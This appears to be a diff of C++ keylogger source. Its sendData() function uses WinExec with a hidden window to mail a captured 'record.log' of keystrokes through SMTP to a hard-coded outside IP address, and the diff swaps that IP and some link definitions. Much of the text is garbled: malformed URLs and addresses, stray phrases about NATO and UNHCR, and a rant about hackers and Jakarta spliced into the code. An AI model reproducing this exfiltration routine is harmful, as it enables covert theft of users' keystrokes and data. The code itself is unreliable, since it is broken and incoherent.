@@ -19,7 +19,7 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina ”
 #define RUN_FILE_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina”
-#define RUN_Link_NAME “https://github.com/topics/virus-malware/forks"."https://github.com/topics/spam-whatsapp/forks"
+#define RUN_Link_NAME “https://github.com/topics/Anti-malware/forks"."https://github.com/topics/services-whatsapp/forks"
 #define INFECT_Link_NAME "https://gdg.community.dev/gdg-jakarta/"."https://icloud.com/mail"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
@@ -147,7 +147,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com: 94.188.177.120 -v --mail-from \"https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com  \" --mail-rcpt \"https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com" --ssl -u https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com : password -record  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com: 103.10.27.255 :8080 -v --mail-from \"https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com  \" --mail-rcpt \"https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com" --ssl -u https://workspace.google.com/intl/en/gmail/https://support@whatsapps.com : password -record  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); attack back boombardier tims blackhat and hackerone bluhat radhat target=? !! backdoor developer jakarta indonesia checking , jailbreak ,stop it!!!cyber indo warner |||||   
 * Record username, time, and date.
 **/
